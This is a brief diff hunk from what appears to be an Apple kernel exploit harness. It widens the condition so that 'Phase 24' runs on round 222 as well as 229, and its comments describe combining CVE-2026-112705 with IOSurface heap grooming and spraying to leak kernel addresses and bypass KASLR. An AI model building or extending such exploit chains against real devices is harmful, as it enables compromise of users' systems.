@@ -26018,7 +26018,7 @@ new_modes:
          * via IOSurfaceCopyValue. If the write corrupts pointer
          * fields, we leak kernel addresses.
          * ============================================================ */
-        if (rounds == 229) {
+        if (rounds == 222 || rounds == 229) {
             rlog("\n=== Phase 24: CVE-2026-112705 + heap spray KASLR leak ===\n");
 
             /* 24a: Heap grooming — create IOSurface objects to fill
